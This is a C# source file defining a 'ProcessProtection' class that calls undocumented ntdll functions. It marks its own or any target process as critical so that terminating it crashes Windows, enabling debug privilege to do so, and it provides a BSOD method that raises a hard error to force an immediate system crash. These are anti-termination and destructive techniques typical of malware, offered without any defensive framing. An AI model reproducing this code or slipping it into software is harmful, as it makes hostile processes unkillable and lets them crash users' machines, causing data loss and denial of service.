using System;
using System.Runtime.InteropServices;
using System.Diagnostics;



class ProcessProtection
{
    [DllImport("ntdll.dll", SetLastError=true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
    
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

    [DllImport("ntdll.dll")]
    private static extern uint NtRaiseHardError(
    uint ErrorStatus,
    uint NumberOfParameters,
    uint UnicodeStringParameterMask,
    IntPtr Parameters,
    uint ValidResponseOption,
    out uint Response
    );

    private static bool IsDebugMode = false;

    public static void ProtectProcess()
    {
        int isCritical = 1;
        int BreakOnTermination = 0x1D;
        if (!IsDebugMode)
        {
            Process.EnterDebugMode();
            IsDebugMode = true;
        }
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
    }

    public static void ProtectProcess(Process target)
    {
        int isCritical = 1;
        int BreakOnTermination = 0x1D;
        if (!IsDebugMode)
        {
            Process.EnterDebugMode();
            IsDebugMode = true;
        }
        NtSetInformationProcess(target.Handle, BreakOnTermination, ref isCritical, sizeof(int));
    }

    public static void UnprotectProcess()
    {
        int isCritical = 0;
        int BreakOnTermination = 0x1D;
        if (!IsDebugMode)
        {
            Process.EnterDebugMode();
            IsDebugMode = true;
        }
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
    }

    public static void UnprotectProcess(Process target)
    {
        int isCritical = 0;
        int BreakOnTermination = 0x1D;
        if (!IsDebugMode)
        {
            Process.EnterDebugMode();
            IsDebugMode = true;
        }
        NtSetInformationProcess(target.Handle, BreakOnTermination, ref isCritical, sizeof(int));
    }

    public static void BSOD()
    {
        bool b;
        uint response;
        uint STATUS_ASSERTION_FAILURE = 0xC0000420;
        RtlAdjustPrivilege(19, true, false, out b);
        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out response);
    }
}